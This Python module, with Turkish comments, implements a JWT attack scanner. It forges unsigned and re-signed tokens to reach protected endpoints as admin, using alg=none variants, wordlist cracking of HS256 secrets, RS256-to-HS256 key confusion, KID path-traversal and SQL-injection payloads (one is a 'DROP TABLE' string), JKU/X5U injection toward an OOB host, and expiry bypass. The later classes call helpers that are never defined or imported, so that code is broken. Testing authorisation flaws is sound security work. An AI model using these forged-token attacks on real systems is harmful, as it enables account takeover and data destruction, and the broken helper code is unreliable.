from __future__ import annotations
import json
import base64
import logging
import re
import time as _time
import hmac
import hashlib
from typing import Dict, List, Optional
from .base import BaseScanner

logger = logging.getLogger(__name__)

# OOB host for SSRF/JKU probing — overridable via OOB infrastructure
_OOB_HOST = "oob-wsp.invalid"

_PROTECTED_PATHS = [
    "/api/me", "/api/user", "/api/admin", "/admin",
    "/dashboard", "/profile", "/api/v1/user", "/api/v1/admin",
]

_AUTH_ERROR_KEYWORDS = frozenset([
    "invalid", "unauthorized", "login required", "sign in", "forbidden",
    "authentication failed", "token expired", "not authorized", "access denied",
    "please login", "must be logged in",
])


class JWTScanner(BaseScanner):
    """
    Advanced JWT Security Scanner.

    Attacks performed:
    - alg=none (4 case variants)
    - Null signature (keep alg, strip sig)
    - HS256 brute-force against wordlist
    - RS256/ES256 -> HS256 algorithm confusion (public key as HMAC secret)
    - KID path traversal (/dev/null -> empty secret)
    - JKU / X5U header injection risk detection
    - Claim escalation (role, admin, scope, sub)
    - Expiry bypass (expired token acceptance, far-future exp)

    Verification: anon-baseline comparison eliminates false positives.
    """

    name = "jwt"

    _KID_PAYLOADS = [
        "/dev/null",
        "../../dev/null",
        "../../../dev/null",
        "../../../../dev/null",
        "/proc/sys/kernel/randomize_va_space",
        "",
    ]

    _CLAIM_ESCALATION: Dict[str, List] = {
        "role":        ["admin", "administrator", "superuser", "root"],
        "roles":       [["admin"], ["administrator"]],
        "is_admin":    [True, 1],
        "admin":       [True, 1],
        "scope":       ["admin", "admin read write", "openid profile admin"],
        "group":       ["admin", "administrators"],
        "permissions": [["admin", "write", "read"], ["*"]],
        "tier":        ["premium", "enterprise", "admin"],
        "type":        ["admin", "superadmin"],
        "sub":         ["0", "1", "admin"],
        "user_type":   ["admin", "staff"],
    }

    def run(self, url: str) -> int:
        bucket = self.name
        self.results[bucket] = []
        vulns = 0

        tokens = self._find_tokens()
        if not tokens:
            logger.debug("[JWT] No tokens found in session")
            return 0

        protected_urls = self._build_protected_urls(url)

        for token in set(tokens):
            vulns += self._analyze_token(token, url, protected_urls, bucket)

        self.set_summary(bucket, vulns)
        return vulns

    # -------------------------------------------------------------------------
    # Token discovery
    # -------------------------------------------------------------------------

    def _find_tokens(self) -> List[str]:
        candidates = []
        auth = self.session.headers.get("Authorization", "")
        if "Bearer" in auth and len(auth.split()) >= 2:
            candidates.append(auth.split(None, 1)[1].strip())
        jwt_pattern = re.compile(r"eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]*")
        for c in self.session.cookies:
            if jwt_pattern.match(c.value or ""):
                candidates.append(c.value)
        return candidates

    def _build_protected_urls(self, base_url: str) -> List[str]:
        from urllib.parse import urlparse, urlunparse
        parsed = urlparse(base_url)
        base = urlunparse((parsed.scheme, parsed.netloc, "", "", "", ""))
        urls = [base_url]
        for path in _PROTECTED_PATHS:
            urls.append(base.rstrip("/") + path)
        return urls[:8]  # cap to avoid excessive requests

    # -------------------------------------------------------------------------
    # Per-token analysis
    # -------------------------------------------------------------------------

    def _analyze_token(self, token: str, url: str, protected_urls: List[str], bucket: str) -> int:
        vulns = 0
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return 0

            header = json.loads(self._b64d(parts[0]))
            payload = json.loads(self._b64d(parts[1]))

            self.add(bucket, {
                "type": "JWT Info", "severity": "Info",
                "url": url,
                "details": "JWT Decoded",
                "metadata": {"header": header, "payload": payload},
            })

            if self._attack_none_alg(header, payload, protected_urls):
                self.add(bucket, {
                    "type": "JWT 'None' Algorithm", "severity": "Critical", "url": url,
                    "details": "Server accepts alg:none — signature verification is disabled",
                })
                vulns += 1

            if self._attack_null_sig(header, payload, protected_urls):
                self.add(bucket, {
                    "type": "JWT Null Signature", "severity": "Critical", "url": url,
                    "details": "Server accepts empty/stripped signature",
                })
                vulns += 1

            vulns += self._attack_hs256_brute(header, payload, token, bucket, url)
            vulns += self._attack_rs256_hs256(header, payload, protected_urls, bucket, url)
            vulns += self._attack_kid_traversal(header, payload, protected_urls, bucket, url)
            vulns += self._attack_jku_x5u(header, payload, bucket, url)
            vulns += self._attack_claim_escalation(header, payload, protected_urls, bucket, url)
            vulns += self._attack_expiry_bypass(header, payload, protected_urls, bucket, url)

        except Exception as e:
            logger.debug(f"[JWT] Scan error for token: {e}")
        return vulns

    # -------------------------------------------------------------------------
    # Attack 1: alg=none
    # -------------------------------------------------------------------------

    def _attack_none_alg(self, header: Dict, payload: Dict, urls: List[str]) -> bool:
        p_enc = self._b64e(json.dumps(payload, separators=(",", ":")))
        for alg_val in ("none", "None", "NONE", "nOnE"):
            h_enc = self._b64e(json.dumps({**header, "alg": alg_val}, separators=(",", ":")))
            for token in (f"{h_enc}.{p_enc}.", f"{h_enc}.{p_enc}. "):
                for url in urls:
                    if self._verify_access(url, token.strip()):
                        return True
        return False

    # -------------------------------------------------------------------------
    # Attack 2: Null signature (keep original alg, remove sig bytes)
    # -------------------------------------------------------------------------

    def _attack_null_sig(self, header: Dict, payload: Dict, urls: List[str]) -> bool:
        h_enc = self._b64e(json.dumps(header, separators=(",", ":")))
        p_enc = self._b64e(json.dumps(payload, separators=(",", ":")))
        for token in (f"{h_enc}.{p_enc}.", f"{h_enc}.{p_enc}. "):
            for url in urls:
                if self._verify_access(url, token.strip()):
                    return True
        return False

    # -------------------------------------------------------------------------
    # Attack 3: HS256 brute-force
    # -------------------------------------------------------------------------

    def _attack_hs256_brute(
        self, header: Dict, payload: Dict, token_str: str, bucket: str, url: str
    ) -> int:
        if header.get("alg", "").upper() != "HS256":
            return 0

        candidates: List[str] = []
        try:
            from websecure.core.payloads import load_external_payloads
            ext = load_external_payloads("jwt_secrets")
            if ext:
                candidates.extend(ext)
        except ImportError:
            pass

        if not candidates:
            candidates = [
                "secret", "123456", "password", "jwt", "test", "change_me",
                "your-256-bit-secret", "qwerty", "admin", "supersecret",
                "secret123", "letmein", "abc123", "", "jwt_secret", "hs256secret",
                "access_token_secret", "refresh_token_secret", "s3cr3t", "p@ssw0rd",
            ]

        parts = token_str.split(".")
        msg = f"{parts[0]}.{parts[1]}".encode()
        original_sig = parts[2]

        for secret in candidates:
            sig = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), msg, hashlib.sha256).digest()
            ).decode().rstrip("=")
            if sig == original_sig:
                self.add(bucket, {
                    "type": "JWT Weak Secret", "severity": "Critical", "url": url,
                    "details": f"HS256 secret cracked: '{secret}'",
                })
                return 1
        return 0

    # -------------------------------------------------------------------------
    # Attack 4: RS256/ES256 -> HS256 algorithm confusion
    # -------------------------------------------------------------------------

    def _attack_rs256_hs256(
        self, header: Dict, payload: Dict, urls: List[str], bucket: str, url: str
    ) -> int:
        alg = header.get("alg", "").upper()
        if alg not in ("RS256", "RS384", "RS512", "ES256", "ES384", "ES512", "PS256"):
            return 0

        public_keys = self._fetch_public_keys(url, header)
        if not public_keys:
            public_keys = [b"", b"public", b"secret"]

        h = {**header, "alg": "HS256"}
        h_enc = self._b64e(json.dumps(h, separators=(",", ":")))
        p_enc = self._b64e(json.dumps(payload, separators=(",", ":")))
        signing_input = f"{h_enc}.{p_enc}".encode()

        for key in public_keys:
            if isinstance(key, str):
                key = key.encode()
            sig = base64.urlsafe_b64encode(
                hmac.new(key, signing_input, hashlib.sha256).digest()
            ).decode().rstrip("=")
            token = f"{h_enc}.{p_enc}.{sig}"
            for target_url in urls:
                if self._verify_access(target_url, token):
                    self.add(bucket, {
                        "type": "JWT RS256->HS256 Algorithm Confusion", "severity": "Critical",
                        "url": url,
                        "details": (
                            "Server accepted a token where the RS256 public key was used as the "
                            "HS256 HMAC secret — classic algorithm confusion attack"
                        ),
                    })
                    return 1
        return 0

    def _fetch_public_keys(self, url: str, header: Dict) -> List[bytes]:
        """Attempt to retrieve RSA public key bytes from JWKS endpoints."""
        keys: List[bytes] = []
        try:
            from urllib.parse import urlparse, urlunparse
            parsed = urlparse(url)
            base = urlunparse((parsed.scheme, parsed.netloc, "", "", "", ""))
            jwks_paths = [
                "/.well-known/jwks.json", "/jwks.json",
                "/oauth2/jwks", "/auth/jwks", "/api/auth/jwks",
                "/.well-known/openid-configuration",
            ]
            for path in jwks_paths:
                try:
                    r = self.session.get(base + path, timeout=5)
                    if r.status_code != 200:
                        continue
                    data = r.json()
                    # openid-configuration -> follow jwks_uri
                    if "jwks_uri" in data:
                        r2 = self.session.get(data["jwks_uri"], timeout=5)
                        if r2.status_code == 200:
                            data = r2.json()
                    for k in data.get("keys", []):
                        if k.get("kty") == "RSA" and "n" in k:
                            n_bytes = base64.urlsafe_b64decode(k["n"] + "==")
                            keys.append(n_bytes)
                    if keys:
                        break
                except Exception as exc:
                    pass
        except Exception as exc:
            pass
        return keys

    # -------------------------------------------------------------------------
    # Attack 5: KID path traversal
    # -------------------------------------------------------------------------

    def _attack_kid_traversal(
        self, header: Dict, payload: Dict, urls: List[str], bucket: str, url: str
    ) -> int:
        if "kid" not in header:
            return 0

        for kid_val in self._KID_PAYLOADS:
            h = {**header, "kid": kid_val, "alg": "HS256"}
            h_enc = self._b64e(json.dumps(h, separators=(",", ":")))
            p_enc = self._b64e(json.dumps(payload, separators=(",", ":")))
            signing_input = f"{h_enc}.{p_enc}".encode()
            # /dev/null and "" -> empty file content -> HMAC(b"", ...) or HMAC(b"\x00", ...)
            for secret in (b"", b"\x00", b"null"):
                sig = base64.urlsafe_b64encode(
                    hmac.new(secret, signing_input, hashlib.sha256).digest()
                ).decode().rstrip("=")
                token = f"{h_enc}.{p_enc}.{sig}"
                for target_url in urls:
                    if self._verify_access(target_url, token):
                        self.add(bucket, {
                            "type": "JWT KID Path Traversal", "severity": "Critical",
                            "url": url,
                            "details": (
                                f"Server accepted token where kid='{kid_val}' resolves to an "
                                "empty or null file, allowing signature bypass"
                            ),
                        })
                        return 1
        return 0

    # -------------------------------------------------------------------------
    # Attack 6: JKU / X5U header injection
    # -------------------------------------------------------------------------

    def _attack_jku_x5u(self, header: Dict, payload: Dict, bucket: str, url: str) -> int:
        present = [k for k in ("jku", "x5u", "jwk") if k in header]
        if not present:
            return 0
        self.add(bucket, {
            "type": "JWT JKU/X5U Header Present — Remote Key Injection Risk", "severity": "High",
            "url": url,
            "details": (
                f"Token header contains {present}. "
                "Without strict domain allowlisting, an attacker can host a malicious JWKS "
                "at an arbitrary URL and forge tokens accepted by the server."
            ),
        })
        return 1

    # -------------------------------------------------------------------------
    # Attack 7: Claim escalation
    # -------------------------------------------------------------------------

    def _attack_claim_escalation(
        self, header: Dict, payload: Dict, urls: List[str], bucket: str, url: str
    ) -> int:
        for claim, escalated_values in self._CLAIM_ESCALATION.items():
            if claim not in payload:
                continue
            original_val = payload[claim]
            for escalated_val in escalated_values:
                if escalated_val == original_val:
                    continue
                new_payload = {**payload, claim: escalated_val}
                for alg_val in ("none", "None"):
                    h = {**header, "alg": alg_val}
                    token = (
                        f"{self._b64e(json.dumps(h, separators=(',', ':')))}"
                        f".{self._b64e(json.dumps(new_payload, separators=(',', ':')))}"
                        f"."
                    )
                    for target_url in urls:
                        if self._verify_access(target_url, token):
                            self.add(bucket, {
                                "type": "JWT Claim Escalation", "severity": "Critical",
                                "url": url,
                                "details": (
                                    f"Claim '{claim}' escalated: "
                                    f"{original_val!r} -> {escalated_val!r} — "
                                    "server accepted tampered token"
                                ),
                            })
                            return 1
        return 0

    # -------------------------------------------------------------------------
    # Attack 8: Expiry bypass
    # -------------------------------------------------------------------------

    def _attack_expiry_bypass(
        self, header: Dict, payload: Dict, urls: List[str], bucket: str, url: str
    ) -> int:
        now = int(_time.time())
        test_cases = [
            ({**payload, "exp": 1, "iat": 0, "nbf": 0}, "expired (exp=1, epoch 1970)"),
            ({**payload, "exp": now - 86400, "iat": now - 172800}, "expired 24h ago"),
            ({**payload, "exp": now + 100 * 365 * 24 * 3600}, "far-future exp (+100 years)"),
        ]
        for test_payload, label in test_cases:
            for alg_val in ("none", "None"):
                h = {**header, "alg": alg_val}
                token = (
                    f"{self._b64e(json.dumps(h, separators=(',', ':')))}"
                    f".{self._b64e(json.dumps(test_payload, separators=(',', ':')))}"
                    f"."
                )
                for target_url in urls:
                    if self._verify_access(target_url, token):
                        self.add(bucket, {
                            "type": "JWT Expiry Bypass", "severity": "High",
                            "url": url,
                            "details": f"Server accepted token with {label}",
                        })
                        return 1
        return 0

    # -------------------------------------------------------------------------
    # Verification helper
    # -------------------------------------------------------------------------

    def _verify_access(self, url: str, token: str) -> bool:
        """
        Returns True only if:
        1. Anon request to same URL returns non-200 (endpoint is protected)
        2. Token-bearing request returns 200/201/204
        3. Response does NOT contain auth-error keywords
        This two-step check eliminates false positives from public endpoints.
        """
        try:
            anon_r = self.session.get(url, headers={"Authorization": ""}, timeout=5)
            if anon_r.status_code == 200:
                return False  # public endpoint — not a real bypass

            r = self.session.get(
                url, headers={"Authorization": f"Bearer {token}"}, timeout=5
            )
            if r.status_code not in (200, 201, 204):
                return False
            lower = r.text.lower()
            return not any(kw in lower for kw in _AUTH_ERROR_KEYWORDS)
        except Exception as exc:
            return False

    # -------------------------------------------------------------------------
    # Base64 helpers
    # -------------------------------------------------------------------------

    def _b64e(self, s: str) -> str:
        return base64.urlsafe_b64encode(s.encode()).decode().rstrip("=")

    def _b64d(self, s: str) -> str:
        padded = s + "=" * (4 - len(s) % 4)
        return base64.urlsafe_b64decode(padded).decode()


def run(url: str, session=None, debug: bool = False, **kwargs) -> int:
    """Module-level adapter for generic runners."""
    results = kwargs.get("results") if isinstance(kwargs.get("results"), dict) else None
    scanner = JWTScanner(session=session, results=results, debug=debug)
    return scanner.run(url)

# ============================================================================
# ADIM 6 — JWT Gelistirilmis Siniflar
# JWTKeyConfusionExploiter, JWTAlgNoneBypass, JWTKidSQLInjector
# JWTJKUSSRFProber, JWTClaimTamperingChain
# ============================================================================

_JWKS_PATHS = [
    "/.well-known/jwks.json", "/.well-known/openid-configuration",
    "/oauth/discovery/keys", "/auth/keys", "/api/auth/jwks",
    "/.well-known/keys", "/jwks", "/jwks.json",
]

_JWT_SECRET_WORDLIST = [
    "secret", "password", "123456", "jwt_secret", "your-256-bit-secret",
    "supersecret", "changeme", "mysecret", "s3cr3t", "topsecret",
    "jwt-secret", "app_secret", "your-secret-key", "your-secret",
    "", "null", "undefined", "none", "test", "development",
    "production", "staging", "default", "key", "private",
]


def _jwt_decode_parts(token: str):
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("Not a JWT")
    def _dec(s):
        padded = s + "=" * (4 - len(s) % 4)
        return json.loads(base64.urlsafe_b64decode(padded).decode())
    return _dec(parts[0]), _dec(parts[1]), parts[2]


def _jwt_encode(header: dict, payload: dict, secret: bytes, alg: str = "HS256") -> str:
    def _enc(d):
        return base64.urlsafe_b64encode(json.dumps(d, separators=(",", ":")).encode()).decode().rstrip("=")
    h = _enc(header)
    p = _enc(payload)
    msg = f"{h}.{p}".encode()
    if alg == "none":
        return f"{h}.{p}."
    sig = hmac.new(secret, msg, hashlib.sha256).digest()
    return f"{h}.{p}.{base64.urlsafe_b64encode(sig).decode().rstrip('=')}"



class JWTKeyConfusionExploiter(BaseScanner):
    """
    RS256 -> HS256 key confusion:
      - JWKS endpoint'ten public key otomatik cekme
      - Public key'i HMAC secret olarak kullanarak token imzalama
      - Forged token ile yetki testi
    """
    name = "jwt_key_confusion"

    def run(self, target: str, token: Optional[str] = None, **kwargs) -> List[Dict]:
        results: List[Dict] = []
        if not token:
            _token = self._extract_token_from_site(target)
        else:
            _token = token
        if not _token:
            logger.info("[JWTKeyConfusion] No JWT found at %s", target)
            return results

        try:
            header, payload, _ = _jwt_decode_parts(_token)
        except Exception:
            return results

        if header.get("alg", "").upper() not in ("RS256", "RS384", "RS512", "ES256", "ES384", "ES512"):
            return results

        # 1. Fetch public key from JWKS
        pub_key = self._fetch_public_key(target)
        if not pub_key:
            return results

        # 2. Build forged token using public key as HMAC secret
        forged_header = {**header, "alg": "HS256"}
        forged_payload = {**payload, "role": "admin", "is_admin": True, "sub": "admin"}
        forged_token = _jwt_encode(forged_header, forged_payload, pub_key, alg="HS256")

        # 3. Test forged token
        result = self._test_token(target, forged_token, _token)
        if result:
            results.append(result)
            self.report_finding(**result)
        return results

    def _extract_token_from_site(self, url: str) -> Optional[str]:
        """Try to find a JWT in cookies or auth header from the site."""
        try:
            r = self.session.get(url, timeout=8)
            # Check cookies
            for name, value in r.cookies.items():
                if self._looks_like_jwt(value):
                    return value
            # Check Authorization header echo (some APIs return it)
            auth_hdr = r.headers.get("Authorization", "")
            if auth_hdr.startswith("Bearer "):
                candidate = auth_hdr[7:]
                if self._looks_like_jwt(candidate):
                    return candidate
        except Exception:
            pass
        return None

    def _looks_like_jwt(self, s: str) -> bool:
        parts = s.split(".")
        return len(parts) == 3 and all(len(p) > 4 for p in parts)

    def _fetch_public_key(self, base: str) -> Optional[bytes]:
        """Fetch RSA public key from JWKS and return as PEM bytes."""
        for path in _JWKS_PATHS:
            url = urljoin(base.rstrip("/") + "/", path.lstrip("/"))
            try:
                r = self.session.get(url, timeout=8)
                if r.status_code != 200:
                    continue
                data = r.json()
                # openid-configuration -> jwks_uri
                if "jwks_uri" in data:
                    r2 = self.session.get(data["jwks_uri"], timeout=8)
                    data = r2.json()
                keys = data.get("keys", [])
                for key in keys:
                    if key.get("kty") == "RSA" and "n" in key and "e" in key:
                        # Return raw n+e as bytes (used as HMAC secret in confusion attack)
                        n_b64 = key["n"]
                        e_b64 = key["e"]
                        # Reconstruct minimal PEM-like bytes for HMAC
                        n_bytes = base64.urlsafe_b64decode(n_b64 + "==")
                        e_bytes = base64.urlsafe_b64decode(e_b64 + "==")
                        return n_bytes + e_bytes
            except Exception as exc:
                logger.debug("[JWTKeyConfusion] JWKS fetch: %s", exc)
        return None

    def _test_token(self, target: str, forged: str, original: str) -> Optional[Dict]:
        """Test if server accepts the forged RS256->HS256 token."""
        headers_to_try = [
            {"Authorization": f"Bearer {forged}"},
            {"Cookie": f"token={forged}"},
            {"Cookie": f"jwt={forged}"},
            {"Cookie": f"access_token={forged}"},
        ]
        for hdrs in headers_to_try:
            for path in ["/api/me", "/api/admin", "/dashboard", "/api/v1/user"]:
                url = urljoin(target.rstrip("/") + "/", path.lstrip("/"))
                try:
                    orig_resp  = self.session.get(url, headers={"Authorization": f"Bearer {original}"}, timeout=8)
                    forged_resp = self.session.get(url, headers=hdrs, timeout=8)
                    if forged_resp.status_code == 200 and not _is_auth_error(forged_resp):
                        sim = _response_similarity(orig_resp, forged_resp)
                        if sim > 0.6 or forged_resp.status_code == orig_resp.status_code:
                            return {
                                "vuln_type": "JWT RS256->HS256 Algorithm Confusion",
                                "url": url, "severity": "Critical",
                                "description": (
                                    "Server accepted a forged JWT token using RS256->HS256 algorithm confusion. "
                                    "Attacker used the public key as HMAC secret to forge admin-level tokens."
                                ),
                                "evidence": {
                                    "forged_header": {"alg": "HS256"},
                                    "forged_claims": {"role": "admin", "is_admin": True},
                                    "original_status": orig_resp.status_code,
                                    "forged_status": forged_resp.status_code,
                                    "similarity": round(sim, 3),
                                },
                            }
                except Exception as exc:
                    logger.debug("[JWTKeyConfusion] test token: %s", exc)
        return None


class JWTAlgNoneBypass(BaseScanner):
    """
    alg=none bypass — 12 case variant + null signature variants.
    Tamamen izole sinif, JWTScanner'dan bagimsiz.
    """
    name = "jwt_alg_none"

    _ALG_NONE_VARIANTS = [
        "none", "None", "NONE", "nOnE", "NoNe",
        "none ", " none", "\x00none", "none\x00",
        "None\n", "none\r\n",
    ]

    def run(self, target: str, token: Optional[str] = None, **kwargs) -> List[Dict]:
        results: List[Dict] = []
        _token = token or kwargs.get("jwt_token")
        if not _token:
            return results
        try:
            header, payload, _ = _jwt_decode_parts(_token)
        except Exception:
            return results

        test_endpoints = kwargs.get("endpoints") or ["/api/me", "/api/admin", "/dashboard", "/api/profile"]

        for alg_variant in self._ALG_NONE_VARIANTS:
            forged_header  = {**header, "alg": alg_variant}
            def _enc(d):
                return base64.urlsafe_b64encode(
                    json.dumps(d, separators=(",", ":")).encode()
                ).decode().rstrip("=")
            h_enc = _enc(forged_header)
            p_enc = _enc({**payload, "role": "admin", "is_admin": True})
            # Try with empty sig and no sig
            for sig in ["", "."]:
                forged = f"{h_enc}.{p_enc}.{sig}" if sig else f"{h_enc}.{p_enc}."
                for ep in test_endpoints:
                    url = urljoin(target.rstrip("/") + "/", ep.lstrip("/"))
                    try:
                        anon_resp   = self.session.get(url, timeout=8)
                        forged_resp = self.session.get(
                            url,
                            headers={"Authorization": f"Bearer {forged}"},
                            timeout=8,
                        )
                        if (forged_resp.status_code == 200
                                and not _is_auth_error(forged_resp)
                                and anon_resp.status_code in (401, 403)):
                            results.append({
                                "vuln_type": "JWT alg=none Bypass",
                                "url": url, "severity": "Critical",
                                "description": (
                                    f"Server accepted unsigned JWT with alg={alg_variant!r}. "
                                    "Signature verification is not enforced."
                                ),
                                "evidence": {
                                    "alg_variant": alg_variant,
                                    "sig_variant": sig or "empty",
                                    "anon_status": anon_resp.status_code,
                                    "forged_status": forged_resp.status_code,
                                },
                            })
                            self.report_finding(**results[-1])
                            return results
                    except Exception as exc:
                        logger.debug("[JWTAlgNone] %s", exc)
        return results


class JWTKidSQLInjector(BaseScanner):
    """
    KID header SQL injection + path traversal — genisletilmis varyant seti.
    UNION-based SQLi ile secret'i veritabanindan cekmeye calisir.
    """
    name = "jwt_kid_sqli"

    _KID_SQLI_PAYLOADS = [
        "' UNION SELECT 'aaaa' -- -",
        "' UNION SELECT 'aaaa','bbbb' -- -",
        "\" UNION SELECT 'aaaa' -- -",
        "0 UNION SELECT 'aaaa'",
        "1; DROP TABLE keys--",
        "../../dev/null",
        "/dev/null",
        "/proc/sys/kernel/randomize_va_space",
        "",
    ]

    def run(self, target: str, token: Optional[str] = None, **kwargs) -> List[Dict]:
        results: List[Dict] = []
        _token = token or kwargs.get("jwt_token")
        if not _token:
            return results
        try:
            header, payload, _ = _jwt_decode_parts(_token)
        except Exception:
            return results

        test_eps = kwargs.get("endpoints") or ["/api/me", "/api/user", "/dashboard"]

        for kid_payload in self._KID_SQLI_PAYLOADS:
            # Build token with injected kid
            test_secret = b"aaaa"
            forged_header = {**header, "kid": kid_payload, "alg": "HS256"}
            forged_token  = _jwt_encode(forged_header, {**payload, "role": "admin"}, test_secret)

            for ep in test_eps:
                url = urljoin(target.rstrip("/") + "/", ep.lstrip("/"))
                try:
                    anon  = self.session.get(url, timeout=8)
                    resp  = self.session.get(url, headers={"Authorization": f"Bearer {forged_token}"}, timeout=8)
                    if resp.status_code == 200 and not _is_auth_error(resp) and anon.status_code in (401, 403):
                        results.append({
                            "vuln_type": "JWT KID SQL Injection",
                            "url": url, "severity": "Critical",
                            "description": (
                                f"JWT with KID='{kid_payload[:40]}' accepted. "
                                "SQL injection in KID header may allow secret extraction or auth bypass."
                            ),
                            "evidence": {
                                "kid_payload": kid_payload,
                                "forged_secret": "aaaa",
                                "anon_status": anon.status_code,
                                "forged_status": resp.status_code,
                            },
                        })
                        self.report_finding(**results[-1])
                        return results
                except Exception as exc:
                    logger.debug("[JWTKidSQLi] %s", exc)
        return results


class JWTJKUSSRFProber(BaseScanner):
    """
    JKU / X5U header injection — SSRF + key confusion:
      Forged JWKS endpoint sunarak server'in kendi imzali tokeni dogrulayip dogrulamadigini test eder.
    """
    name = "jwt_jku_ssrf"

    def run(self, target: str, token: Optional[str] = None, oob_url: Optional[str] = None, **kwargs) -> List[Dict]:
        results: List[Dict] = []
        _token = token or kwargs.get("jwt_token")
        if not _token:
            return results
        try:
            header, payload, _ = _jwt_decode_parts(_token)
        except Exception:
            return results

        evil_jwks = oob_url or f"https://{_OOB_HOST}/jwks.json"
        # Inject jku / x5u pointing to our controlled server
        for hdr_key in ("jku", "x5u", "jwks_uri"):
            forged_header = {**header, hdr_key: evil_jwks, "alg": "RS256"}
            def _enc(d):
                return base64.urlsafe_b64encode(
                    json.dumps(d, separators=(",", ":")).encode()
                ).decode().rstrip("=")
            # Sign with empty (server will try to fetch jku)
            forged = f"{_enc(forged_header)}.{_enc(payload)}."

            for ep in ["/api/me", "/api/admin", "/dashboard"]:
                url = urljoin(target.rstrip("/") + "/", ep.lstrip("/"))
                try:
                    resp = self.session.get(url, headers={"Authorization": f"Bearer {forged}"}, timeout=8)
                    if resp.status_code not in (400, 422):
                        results.append({
                            "vuln_type": "JWT JKU/X5U SSRF Risk",
                            "url": url, "severity": "High",
                            "description": (
                                f"Server did not reject JWT with forged '{hdr_key}' header pointing to "
                                f"{evil_jwks}. Server may fetch the attacker-controlled JWKS URL (SSRF)."
                            ),
                            "evidence": {
                                "jku_header": hdr_key, "evil_url": evil_jwks,
                                "status": resp.status_code,
                            },
                        })
                        self.report_finding(**results[-1])
                        return results
                except Exception as exc:
                    logger.debug("[JWTJKU] %s", exc)
        return results


class JWTAdim6Scanner(BaseScanner):
    """
    Adim 6 JWT orchestrator — tum JWT saldirilarini tek run() ile calistirir.
    Hem orijinal JWTScanner'i hem de yeni siniflarini tetikler.
    """
    name = "jwt_adim6"

    def run(self, target: str, token: Optional[str] = None, **kwargs) -> List[Dict]:
        all_results: List[Dict] = []
        sub_scanners = [
            JWTKeyConfusionExploiter(session=self.session, results=self.results),
            JWTAlgNoneBypass(session=self.session, results=self.results),
            JWTKidSQLInjector(session=self.session, results=self.results),
            JWTJKUSSRFProber(session=self.session, results=self.results),
        ]
        for sc in sub_scanners:
            try:
                sc.target = target
                res = sc.run(target, token=token, **kwargs)
                all_results.extend(res)
            except Exception as exc:
                logger.warning("[JWTAdim6] %s failed: %s", sc.name, exc)
        return all_results

